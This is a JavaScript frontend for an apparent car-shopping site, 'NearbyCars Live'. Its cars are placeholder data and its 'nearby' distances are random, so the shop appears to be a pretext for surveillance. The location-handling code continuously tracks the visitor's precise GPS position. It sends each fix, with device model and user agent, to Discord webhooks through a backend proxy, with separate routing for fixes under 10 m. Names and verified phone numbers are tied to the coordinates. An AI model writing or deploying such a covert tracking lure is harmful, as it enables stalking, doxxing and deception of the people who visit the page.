/**
 * ============================================
 * NearbyCars Live - Frontend JavaScript
 * ============================================
 * Handles:
 * - Location detection and continuous tracking
 * - Discord webhook communication via backend proxy
 * - User name capture and personalization
 * - Optional OTP mobile verification
 * - Car catalog filtering, sorting, and display
 * - Order inquiry modal
 */

// ═══════════════════════════════════════════════
//              CAR DATA (Fake/Placeholder)
// Replace these with real dealer data later
// ═══════════════════════════════════════════════
const carDatabase = [
  {
    id: 1,
    brand: 'Lamborghini',
    model: 'Huracan EVO',
    type: 'supercar',
    price: 32200000,
    priceLakh: '3.22 Cr',
    image: 'https://images.unsplash.com/photo-1544636331-e26879cd4d9b?w=600&h=400&fit=crop',
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Lamborghini Mumbai',
    distance: 0
  },
  {
    id: 2,
    brand: 'Ferrari',
    model: 'Roma',
    type: 'supercar',
    price: 36100000,
    priceLakh: '3.61 Cr',
    image: 'https://images.unsplash.com/photo-1592198084033-aade902d1aae?w=600&h=400&fit=crop',
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Ferrari Delhi',
    distance: 0
  },
  {
    id: 3,
    brand: 'Porsche',
    model: '911 Turbo S',
    type: 'supercar',
    price: 33500000,
    priceLakh: '3.35 Cr',
    image: 'https://images.unsplash.com/photo-1614162692292-7ac56d7f7f1e?w=600&h=400&fit=crop',
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Porsche Bangalore',
    distance: 0
  },
  {
    id: 4,
    brand: 'Mercedes-Benz',
    model: 'S-Class',
    type: 'luxury',
    price: 17000000,
    priceLakh: '1.70 Cr',
    image: 'https://images.unsplash.com/photo-1618843479313-40f8afb4b4d8?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel',
    transmission: 'Automatic',
    badges: ['new'],
    dealer: 'Mercedes Hyderabad',
    distance: 0
  },
  {
    id: 5,
    brand: 'BMW',
    model: '7 Series',
    type: 'luxury',
    price: 16500000,
    priceLakh: '1.65 Cr',
    image: 'https://images.unsplash.com/photo-1555215695-3004980ad54e?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel',
    transmission: 'Automatic',
    badges: ['new'],
    dealer: 'BMW Pune',
    distance: 0
  },
  {
    id: 6,
    brand: 'Audi',
    model: 'RS7 Sportback',
    type: 'luxury',
    price: 22400000,
    priceLakh: '2.24 Cr',
    image: 'https://images.unsplash.com/photo-1606664515524-ed2f786a0bd6?w=600&h=400&fit=crop',
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Audi Chennai',
    distance: 0
  },
  {
    id: 7,
    brand: 'Mahindra',
    model: 'Thar',
    type: 'suv',
    price: 1565000,
    priceLakh: '15.65 Lakh',
    image: 'https://images.unsplash.com/photo-1606016159991-dfe4f2746ad5?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/Auto',
    badges: ['offroad'],
    dealer: 'Mahindra showroom',
    distance: 0
  },
  {
    id: 8,
    brand: 'Hyundai',
    model: 'Creta',
    type: 'suv',
    price: 1157000,
    priceLakh: '11.57 Lakh',
    image: 'https://images.unsplash.com/photo-1626668011687-8a114cf5a34c?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT',
    badges: ['new'],
    dealer: 'Hyundai showroom',
    distance: 0
  },
  {
    id: 9,
    brand: 'Tata',
    model: 'Harrier',
    type: 'suv',
    price: 1599000,
    priceLakh: '15.99 Lakh',
    image: 'https://images.unsplash.com/photo-1549317661-bd32c8ce0afa?w=600&h=400&fit=crop',
    fuel: 'Diesel',
    transmission: 'Manual/AT',
    badges: ['new'],
    dealer: 'Tata Motors showroom',
    distance: 0
  },
  {
    id: 10,
    brand: 'Kia',
    model: 'Seltos',
    type: 'suv',
    price: 1199000,
    priceLakh: '11.99 Lakh',
    image: 'https://images.unsplash.com/photo-1619767886558-efdc259cde1a?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT/DCT',
    badges: ['new'],
    dealer: 'Kia showroom',
    distance: 0
  },
  {
    id: 11,
    brand: 'Toyota',
    model: 'Fortuner',
    type: 'suv',
    price: 3359000,
    priceLakh: '33.59 Lakh',
    image: 'https://images.unsplash.com/photo-1552519507-da3b142c6e3d?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/AT',
    badges: ['offroad'],
    dealer: 'Toyota showroom',
    distance: 0
  },
  {
    id: 12,
    brand: 'MG',
    model: 'Hector Plus',
    type: 'suv',
    price: 1838000,
    priceLakh: '18.38 Lakh',
    image: 'https://images.unsplash.com/photo-1563720223185-11003d516935?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/CVT',
    badges: ['new'],
    dealer: 'MG showroom',
    distance: 0
  },
  {
    id: 13,
    brand: 'Hyundai',
    model: 'Verna',
    type: 'sedan',
    price: 1195000,
    priceLakh: '11.95 Lakh',
    image: 'https://images.unsplash.com/photo-1621007947382-bb3c3994e3fb?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT',
    badges: ['new'],
    dealer: 'Hyundai showroom',
    distance: 0
  },
  {
    id: 14,
    brand: 'Honda',
    model: 'City',
    type: 'sedan',
    price: 1261000,
    priceLakh: '12.61 Lakh',
    image: 'https://images.unsplash.com/photo-1609521263047-f8f205293f24?w=600&h=400&fit=crop',
    fuel: 'Petrol',
    transmission: 'Manual/CVT',
    badges: ['new'],
    dealer: 'Honda showroom',
    distance: 0
  },
  {
    id: 15,
    brand: 'Maruti Suzuki',
    model: 'Swift',
    type: 'hatchback',
    price: 659000,
    priceLakh: '6.59 Lakh',
    image: 'https://images.unsplash.com/photo-1605559424843-9e4c228bf1c2?w=600&h=400&fit=crop',
    fuel: 'Petrol/CNG',
    transmission: 'Manual/AMT',
    badges: ['new'],
    dealer: 'Maruti Suzuki Arena',
    distance: 0
  },
  {
    id: 16,
    brand: 'Tata',
    model: 'Nexon',
    type: 'suv',
    price: 810000,
    priceLakh: '8.10 Lakh',
    image: 'https://images.unsplash.com/photo-1583121274602-3e2820c69888?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel/EV',
    transmission: 'Manual/AMT',
    badges: ['electric'],
    dealer: 'Tata Motors showroom',
    distance: 0
  },
  {
    id: 17,
    brand: 'Toyota',
    model: 'Innova Crysta',
    type: 'mpv',
    price: 1999000,
    priceLakh: '19.99 Lakh',
    image: 'https://images.unsplash.com/photo-1558618666-fcd25c85f82e?w=600&h=400&fit=crop',
    fuel: 'Diesel/Petrol',
    transmission: 'Manual/AT',
    badges: ['new'],
    dealer: 'Toyota showroom',
    distance: 0
  },
  {
    id: 18,
    brand: 'Hyundai',
    model: 'i20',
    type: 'hatchback',
    price: 703000,
    priceLakh: '7.03 Lakh',
    image: 'https://images.unsplash.com/photo-1549399542-7e3f8b79c341?w=600&h=400&fit=crop',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT',
    badges: ['new'],
    dealer: 'Hyundai showroom',
    distance: 0
  }
];

// ═══════════════════════════════════════════════
//              GLOBAL STATE
// ═══════════════════════════════════════════════
const state = {
  userName: '',
  mobile: '',
  isVerified: false,
  latitude: null,
  longitude: null,
  accuracy: null,
  watchId: null,
  currentCarId: null
};

// ═══════════════════════════════════════════════
//              DOM ELEMENTS
// ═══════════════════════════════════════════════
const DOM = {
  navbar: document.getElementById('navbar'),
  mobileMenu: document.getElementById('mobile-menu'),
  mobileMenuBtn: document.getElementById('mobile-menu-btn'),
  heroLocateBtn: document.getElementById('hero-locate-btn'),
  navLocateBtn: document.getElementById('nav-locate-btn'),
  mobileLocateBtn: document.getElementById('mobile-locate-btn'),
  nameSection: document.getElementById('name-section'),
  nameInput: document.getElementById('user-name-input'),
  submitNameBtn: document.getElementById('submit-name-btn'),
  locationStatus: document.getElementById('location-status'),
  locationSpinner: document.getElementById('location-spinner'),
  locationInfo: document.getElementById('location-info'),
  locationDenied: document.getElementById('location-denied'),
  locationText: document.getElementById('location-text'),
  retryLocationBtn: document.getElementById('retry-location-btn'),
  otpSection: document.getElementById('otp-section'),
  otpCloseBtn: document.getElementById('otp-close-btn'),
  otpStep1: document.getElementById('otp-step-1'),
  otpStep2: document.getElementById('otp-step-2'),
  mobileInput: document.getElementById('mobile-input'),
  sendOtpBtn: document.getElementById('send-otp-btn'),
  skipOtpBtn: document.getElementById('skip-otp-btn'),
  otpInput: document.getElementById('otp-input'),
  verifyOtpBtn: document.getElementById('verify-otp-btn'),
  resendOtpBtn: document.getElementById('resend-otp-btn'),
  otpMessage: document.getElementById('otp-message'),
  otpMobileDisplay: document.getElementById('otp-mobile-display'),
  carGrid: document.getElementById('car-grid'),
  emptyState: document.getElementById('empty-state'),
  resultsCount: document.getElementById('results-count'),
  resultsLocation: document.getElementById('results-location'),
  filterType: document.getElementById('filter-type'),
  filterBrand: document.getElementById('filter-brand'),
  filterPrice: document.getElementById('filter-price'),
  filterSort: document.getElementById('filter-sort'),
  filterResetBtn: document.getElementById('filter-reset-btn'),
  clearFiltersBtn: document.getElementById('clear-filters-btn'),
  orderModal: document.getElementById('order-modal'),
  modalCloseBtn: document.getElementById('modal-close-btn'),
  modalCarName: document.getElementById('modal-car-name'),
  modalCarPrice: document.getElementById('modal-car-price'),
  orderForm: document.getElementById('order-form'),
  orderName: document.getElementById('order-name'),
  orderMobile: document.getElementById('order-mobile'),
  orderLocation: document.getElementById('order-location'),
  orderNotes: document.getElementById('order-notes'),
  modalSuccess: document.getElementById('modal-success'),
  modalDoneBtn: document.getElementById('modal-done-btn')
};

// ═══════════════════════════════════════════════
//              INITIALIZATION
// ═══════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  // Initialize Lucide icons
  if (window.lucide) lucide.createIcons();

  // Render cars
  renderCars(carDatabase);

  // Bind events
  bindEvents();

  // Navbar scroll effect
  window.addEventListener('scroll', () => {
    DOM.navbar.classList.toggle('scrolled', window.scrollY > 50);
  });
});

function bindEvents() {
  // Mobile menu toggle
  DOM.mobileMenuBtn.addEventListener('click', () => {
    DOM.mobileMenu.classList.toggle('active');
  });

  // Close mobile menu on link click
  DOM.mobileMenu.querySelectorAll('.mobile-link').forEach(link => {
    link.addEventListener('click', () => {
      DOM.mobileMenu.classList.remove('active');
    });
  });

  // Location buttons
  DOM.heroLocateBtn.addEventListener('click', requestLocation);
  if (DOM.navLocateBtn) DOM.navLocateBtn.addEventListener('click', (e) => { e.preventDefault(); requestLocation(); });
  if (DOM.mobileLocateBtn) DOM.mobileLocateBtn.addEventListener('click', (e) => { e.preventDefault(); requestLocation(); });
  DOM.retryLocationBtn.addEventListener('click', requestLocation);

  // Name submission
  DOM.submitNameBtn.addEventListener('click', submitUserName);
  DOM.nameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitUserName(); });

  // OTP section
  DOM.otpCloseBtn.addEventListener('click', closeOtpSection);
  DOM.skipOtpBtn.addEventListener('click', closeOtpSection);
  DOM.sendOtpBtn.addEventListener('click', sendOtp);
  DOM.verifyOtpBtn.addEventListener('click', verifyOtp);
  DOM.resendOtpBtn.addEventListener('click', sendOtp);

  // Filters
  DOM.filterType.addEventListener('change', applyFilters);
  DOM.filterBrand.addEventListener('change', applyFilters);
  DOM.filterPrice.addEventListener('change', applyFilters);
  DOM.filterSort.addEventListener('change', applyFilters);
  DOM.filterResetBtn.addEventListener('click', resetFilters);
  if (DOM.clearFiltersBtn) DOM.clearFiltersBtn.addEventListener('click', resetFilters);

  // Order modal
  DOM.modalCloseBtn.addEventListener('click', closeOrderModal);
  DOM.orderModal.addEventListener('click', (e) => {
    if (e.target === DOM.orderModal) closeOrderModal();
  });
  DOM.orderForm.addEventListener('submit', submitOrder);
  DOM.modalDoneBtn.addEventListener('click', closeOrderModal);
}

// ═══════════════════════════════════════════════
//              LOCATION HANDLING
// ═══════════════════════════════════════════════

/**
 * Requests user's geolocation and starts continuous tracking.
 * All location updates are sent to Webhook 1 (continuous tracking).
 * High accuracy updates (< 10m) are also sent to Webhook 2.
 */
function requestLocation() {
  // Check if geolocation is supported
  if (!navigator.geolocation) {
    showLocationError('Geolocation is not supported by your browser.');
    return;
  }

  // Show loading state
  DOM.locationSpinner.style.display = 'flex';
  DOM.locationInfo.style.display = 'none';
  DOM.locationDenied.style.display = 'none';

  // Clear any existing watch
  if (state.watchId) {
    navigator.geolocation.clearWatch(state.watchId);
  }

  // Options for highest accuracy
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };

  // Watch position for continuous updates
  state.watchId = navigator.geolocation.watchPosition(
    handleLocationSuccess,
    handleLocationError,
    options
  );
}

/**
 * Handle successful location capture.
 * Sends to backend which dispatches to appropriate webhooks.
 */
async function handleLocationSuccess(position) {
  const { latitude, longitude, accuracy } = position.coords;
  state.latitude = latitude;
  state.longitude = longitude;
  state.accuracy = accuracy;

  // Get device info
  const deviceInfo = getDeviceInfo();

  // Prepare payload
  const payload = {
    latitude,
    longitude,
    accuracy,
    deviceName: deviceInfo.name,
    deviceModel: deviceInfo.model,
    userAgent: navigator.userAgent,
    timestamp: position.timestamp
  };

  // Send to backend webhook endpoint
  try {
    const response = await fetch('/api/webhook/location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    console.log('[Location] Webhook sent:', data);
  } catch (error) {
    console.error('[Location] Failed to send webhook:', error);
  }

  // If name is already entered, also send name webhook
  if (state.userName) {
    await sendNameWebhook({ ...payload, name: state.userName });
  }

  // Update UI
  updateLocationUI(latitude, longitude, accuracy);

  // Update car distances (random for demo)
  updateCarDistances();
}

/**
 * Handle location errors - show polite message in Hindi + English.
 */
function handleLocationError(error) {
  DOM.locationSpinner.style.display = 'none';
  DOM.locationInfo.style.display = 'none';
  DOM.locationDenied.style.display = 'flex';

  let message = '';
  switch (error.code) {
    case error.PERMISSION_DENIED:
      message = 'Location permission denied';
      break;
    case error.POSITION_UNAVAILABLE:
      message = 'Location information unavailable';
      break;
    case error.TIMEOUT:
      message = 'Location request timed out';
      break;
    default:
      message = 'An unknown error occurred';
  }
  console.warn('[Location Error]', message);
}

function showLocationError(msg) {
  DOM.locationSpinner.style.display = 'none';
  DOM.locationDenied.style.display = 'flex';
  console.error('[Location]', msg);
}

function updateLocationUI(lat, lng, accuracy) {
  DOM.locationSpinner.style.display = 'none';
  DOM.locationInfo.style.display = 'flex';
  DOM.locationDenied.style.display = 'none';

  const accuracyText = accuracy < 10
    ? `High accuracy (${accuracy.toFixed(1)}m)`
    : `~${accuracy.toFixed(0)}m accuracy`;

  DOM.locationText.textContent = `Location detected - ${accuracyText}`;

  // Update results location indicator
  DOM.resultsLocation.innerHTML = `<i data-lucide="map-pin" class="icon-sm"></i> Showing nearby results`;
  if (window.lucide) lucide.createIcons();
}

/**
 * Get device name and model from user agent.
 */
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let name = 'Unknown';
  let model = '';

  if (/iPhone/.test(ua)) {
    name = 'Apple iPhone';
    model = ua.match(/iPhone OS (\d+)/)?.[1] ? `iOS ${ua.match(/iPhone OS (\d+)/)[1]}` : '';
  } else if (/iPad/.test(ua)) {
    name = 'Apple iPad';
  } else if (/Samsung/.test(ua)) {
    name = 'Samsung';
    const match = ua.match(/SM-(\w+)/);
    if (match) model = match[0];
  } else if (/Pixel/.test(ua)) {
    name = 'Google Pixel';
    const match = ua.match(/Pixel (\d+)/);
    if (match) model = `Pixel ${match[1]}`;
  } else if (/OnePlus/.test(ua)) {
    name = 'OnePlus';
    const match = ua.match(/OnePlus[ _](\w+)/);
    if (match) model = match[0];
  } else if (/Xiaomi/.test(ua)) {
    name = 'Xiaomi';
  } else if (/Realme/.test(ua)) {
    name = 'Realme';
  } else if (/Vivo/.test(ua)) {
    name = 'Vivo';
  } else if (/Oppo/.test(ua)) {
    name = 'Oppo';
  } else if (/Android/.test(ua)) {
    name = 'Android Device';
  } else if (/Windows/.test(ua)) {
    name = 'Windows PC';
  } else if (/Macintosh/.test(ua)) {
    name = 'Mac';
  } else if (/Linux/.test(ua)) {
    name = 'Linux Device';
  }

  return { name, model };
}

// ═══════════════════════════════════════════════
//              USER NAME HANDLING
// ═══════════════════════════════════════════════

async function submitUserName() {
  const name = DOM.nameInput.value.trim();
  if (!name) return;

  state.userName = name;

  // Visual feedback
  DOM.submitNameBtn.textContent = '✓';
  DOM.submitNameBtn.disabled = true;
  DOM.nameInput.disabled = true;

  // Send name webhook if location is available
  if (state.latitude !== null) {
    await sendNameWebhook({
      name,
      latitude: state.latitude,
      longitude: state.longitude,
      accuracy: state.accuracy,
      deviceName: getDeviceInfo().name,
      deviceModel: getDeviceInfo().model,
      userAgent: navigator.userAgent,
      timestamp: Date.now()
    });
  }

  // Show OTP section after short delay
  setTimeout(() => {
    DOM.otpSection.style.display = 'block';
    DOM.mobileInput.focus();
  }, 1000);
}

async function sendNameWebhook(payload) {
  try {
    const response = await fetch('/api/webhook/name', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    console.log('[Name] Webhook sent:', data);
  } catch (error) {
    console.error('[Name] Failed to send webhook:', error);
  }
}

// ═══════════════════════════════════════════════
//              OTP VERIFICATION (Optional)
// ═══════════════════════════════════════════════

function closeOtpSection() {
  DOM.otpSection.style.display = 'none';
}

async function sendOtp() {
  const mobile = DOM.mobileInput.value.trim();
  if (!/^\d{10}$/.test(mobile)) {
    showOtpMessage('Please enter a valid 10-digit mobile number', 'error');
    return;
  }

  DOM.sendOtpBtn.disabled = true;
  DOM.sendOtpBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Sending...';

  try {
    const response = await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mobile })
    });
    const data = await response.json();

    if (data.success) {
      DOM.otpStep1.style.display = 'none';
      DOM.otpStep2.style.display = 'block';
      DOM.otpMobileDisplay.textContent = `+91 ${mobile.substring(0, 5)} ${mobile.substring(5)}`;
      DOM.otpInput.focus();
      state.mobile = mobile;
    } else {
      showOtpMessage(data.message || 'Failed to send OTP', 'error');
    }
  } catch (error) {
    showOtpMessage('Network error. Please try again.', 'error');
  }

  DOM.sendOtpBtn.disabled = false;
  DOM.sendOtpBtn.innerHTML = '<i data-lucide="send" class="icon"></i> Send OTP';
  if (window.lucide) lucide.createIcons();
}

async function verifyOtp() {
  const otp = DOM.otpInput.value.trim();
  if (!/^\d{4,6}$/.test(otp)) {
    showOtpMessage('Please enter a valid OTP', 'error');
    return;
  }

  DOM.verifyOtpBtn.disabled = true;
  DOM.verifyOtpBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Verifying...';

  try {
    const response = await fetch('/api/verify-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mobile: state.mobile, otp })
    });
    const data = await response.json();

    if (data.verified) {
      state.isVerified = true;
      showOtpMessage('Mobile verified successfully!', 'success');

      // Log verification to webhook
      await fetch('/api/webhook/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: state.userName,
          mobile: state.mobile,
          latitude: state.latitude,
          longitude: state.longitude,
          accuracy: state.accuracy
        })
      });

      // Pre-fill order form
      DOM.orderName.value = state.userName;
      DOM.orderMobile.value = state.mobile;

      // Close OTP section after delay
      setTimeout(() => closeOtpSection(), 2000);
    } else {
      showOtpMessage(data.message || 'Invalid OTP', 'error');
      DOM.otpInput.value = '';
      DOM.otpInput.focus();
    }
  } catch (error) {
    showOtpMessage('Network error. Please try again.', 'error');
  }

  DOM.verifyOtpBtn.disabled = false;
  DOM.verifyOtpBtn.innerHTML = '<i data-lucide="check-circle" class="icon"></i> Verify OTP';
  if (window.lucide) lucide.createIcons();
}

function showOtpMessage(msg, type) {
  DOM.otpMessage.textContent = msg;
  DOM.otpMessage.className = `otp-message ${type}`;
  setTimeout(() => { DOM.otpMessage.textContent = ''; DOM.otpMessage.className = 'otp-message'; }, 4000);
}

// ═══════════════════════════════════════════════
//              CAR RENDERING & FILTERING
// ═══════════════════════════════════════════════

function renderCars(cars) {
  if (cars.length === 0) {
    DOM.carGrid.style.display = 'none';
    DOM.emptyState.style.display = 'block';
    DOM.resultsCount.textContent = 'No cars found';
    return;
  }

  DOM.carGrid.style.display = 'grid';
  DOM.emptyState.style.display = 'none';
  DOM.resultsCount.textContent = `Showing ${cars.length} car${cars.length !== 1 ? 's' : ''}`;

  DOM.carGrid.innerHTML = cars.map(car => createCarCard(car)).join('');

  // Re-initialize Lucide icons for new elements
  if (window.lucide) lucide.createIcons();
}

function createCarCard(car) {
  const badgesHtml = car.badges.map(b => {
    const labels = { hot: '🔥 Hot', new: '✨ New', electric: '⚡ EV', offroad: '🏔️ Off-Road' };
    return `<span class="badge badge-${b}">${labels[b] || b}</span>`;
  }).join('');

  const distanceHtml = car.distance > 0
    ? `<div class="car-distance"><i data-lucide="map-pin" class="icon-sm"></i> ${car.distance.toFixed(1)} km</div>`
    : '';

  return `
    <div class="car-card" data-id="${car.id}">
      <div class="car-card-image">
        <img src="${car.image}" alt="${car.brand} ${car.model}" loading="lazy"
             onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 600 400%22%3E%3Crect fill=%22%2316213e%22 width=%22600%22 height=%22400%22/%3E%3Ctext fill=%22%236366f1%22 font-size=%2220%22 x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22%3E${car.brand} ${car.model}%3C/text%3E%3C/svg%3E'">
        <div class="car-badge">${badgesHtml}</div>
        ${distanceHtml}
      </div>
      <div class="car-card-body">
        <div class="car-brand">${car.brand}</div>
        <h3 class="car-name">${car.model}</h3>
        <div class="car-specs">
          <div class="car-spec">
            <i data-lucide="fuel" class="icon"></i>
            ${car.fuel}
          </div>
          <div class="car-spec">
            <i data-lucide="settings-2" class="icon"></i>
            ${car.transmission}
          </div>
        </div>
        <div class="car-card-footer">
          <div class="car-price">
            ₹${car.priceLakh}
            <span>Ex-Showroom</span>
          </div>
          <button class="order-btn" onclick="openOrderModal(${car.id})">Order Now</button>
        </div>
        <div class="car-dealer"><i data-lucide="store" class="icon-sm"></i> ${car.dealer}</div>
      </div>
    </div>
  `;
}

function applyFilters() {
  const type = DOM.filterType.value;
  const brand = DOM.filterBrand.value;
  const priceRange = DOM.filterPrice.value;
  const sort = DOM.filterSort.value;

  let filtered = [...carDatabase];

  // Type filter
  if (type !== 'all') {
    filtered = filtered.filter(car => car.type === type);
  }

  // Brand filter
  if (brand !== 'all') {
    filtered = filtered.filter(car => car.brand.toLowerCase().includes(brand));
  }

  // Price filter (in lakhs)
  if (priceRange !== 'all') {
    const [min, max] = priceRange.split('-').map(Number);
    filtered = filtered.filter(car => {
      const priceLakh = car.price / 100000;
      return priceLakh >= min && (max >= 999 ? true : priceLakh <= max);
    });
  }

  // Sort
  switch (sort) {
    case 'price-low':
      filtered.sort((a, b) => a.price - b.price);
      break;
    case 'price-high':
      filtered.sort((a, b) => b.price - a.price);
      break;
    case 'name-az':
      filtered.sort((a, b) => `${a.brand} ${a.model}`.localeCompare(`${b.brand} ${b.model}`));
      break;
    default:
      // Featured: keep original order, supercars first
      filtered.sort((a, b) => {
        const typeOrder = { supercar: 0, luxury: 1, suv: 2, sedan: 3, mpv: 4, hatchback: 5, pickup: 6 };
        return (typeOrder[a.type] || 5) - (typeOrder[b.type] || 5);
      });
  }

  renderCars(filtered);
}

function resetFilters() {
  DOM.filterType.value = 'all';
  DOM.filterBrand.value = 'all';
  DOM.filterPrice.value = 'all';
  DOM.filterSort.value = 'default';
  renderCars(carDatabase);
}

/**
 * Set filter from footer links
 */
function setFilter(type) {
  DOM.filterType.value = type;
  applyFilters();
  document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
}

// Make setFilter available globally
window.setFilter = setFilter;

/**
 * Update car distances with random values (demo).
 * In production, calculate real distances from coordinates.
 */
function updateCarDistances() {
  carDatabase.forEach(car => {
    // Random distance between 0.5 and 45 km for demo
    car.distance = Math.round((Math.random() * 44.5 + 0.5) * 10) / 10;
  });
  applyFilters(); // Re-render with distances
}

// ═══════════════════════════════════════════════
//              ORDER MODAL
// ═══════════════════════════════════════════════

function openOrderModal(carId) {
  const car = carDatabase.find(c => c.id === carId);
  if (!car) return;

  state.currentCarId = carId;

  DOM.modalCarName.textContent = `${car.brand} ${car.model}`;
  DOM.modalCarPrice.textContent = `₹${car.priceLakh} (Ex-Showroom)`;

  // Pre-fill form
  DOM.orderName.value = state.userName || '';
  DOM.orderMobile.value = state.mobile || '';

  if (state.latitude && state.longitude) {
    DOM.orderLocation.value = `${state.latitude.toFixed(6)}, ${state.longitude.toFixed(6)}`;
  }

  // Show form, hide success
  DOM.orderForm.style.display = 'block';
  DOM.modalSuccess.style.display = 'none';
  DOM.orderModal.style.display = 'flex';
  DOM.orderModal.style.flexDirection = 'column';

  // Prevent body scroll
  document.body.style.overflow = 'hidden';
}

window.openOrderModal = openOrderModal;

function closeOrderModal() {
  DOM.orderModal.style.display = 'none';
  document.body.style.overflow = '';
  state.currentCarId = null;
}

async function submitOrder(e) {
  e.preventDefault();

  const car = carDatabase.find(c => c.id === state.currentCarId);
  if (!car) return;

  DOM.orderForm.querySelector('button[type="submit"]').disabled = true;
  DOM.orderForm.querySelector('button[type="submit"]').innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Submitting...';

  try {
    const response = await fetch('/api/order', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: DOM.orderName.value,
        mobile: DOM.orderMobile.value,
        carId: car.id,
        carModel: `${car.brand} ${car.model}`,
        location: DOM.orderLocation.value || 'Not shared'
      })
    });
    const data = await response.json();

    if (data.success) {
      // Show success message
      DOM.orderForm.style.display = 'none';
      DOM.modalSuccess.style.display = 'block';
    }
  } catch (error) {
    console.error('[Order] Error:', error);
    alert('Something went wrong. Please try again.');
  }

  DOM.orderForm.querySelector('button[type="submit"]').disabled = false;
  DOM.orderForm.querySelector('button[type="submit"]').innerHTML = '<i data-lucide="send" class="icon"></i> Submit Inquiry';
  if (window.lucide) lucide.createIcons();
}

// ═══════════════════════════════════════════════
//              KEYBOARD SHORTCUTS
// ═══════════════════════════════════════════════
document.addEventListener('keydown', (e) => {
  // Escape to close modal
  if (e.key === 'Escape') {
    if (DOM.orderModal.style.display === 'flex') closeOrderModal();
    if (DOM.otpSection.style.display === 'block') closeOtpSection();
  }
});
